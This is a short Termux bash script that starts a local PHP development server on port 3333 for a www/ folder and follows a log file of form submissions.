#!/data/data/com.termux/files/usr/bin/bash

# Start PHP server on port 3333
echo "[+] Starting local PHP server on http://127.0.0.1:3333 ..."
php -S 127.0.0.1:3333 -t www/ > /dev/null 2>&1 &

# Wait a moment for server to start
sleep 2

echo "[+] Open in browser: http://127.0.0.1:3333/index.html"
echo "[+] Logging submissions to www/log.txt"

# Create log file if not exists
touch www/log.txt

tail -n 0 -f www/log.txt
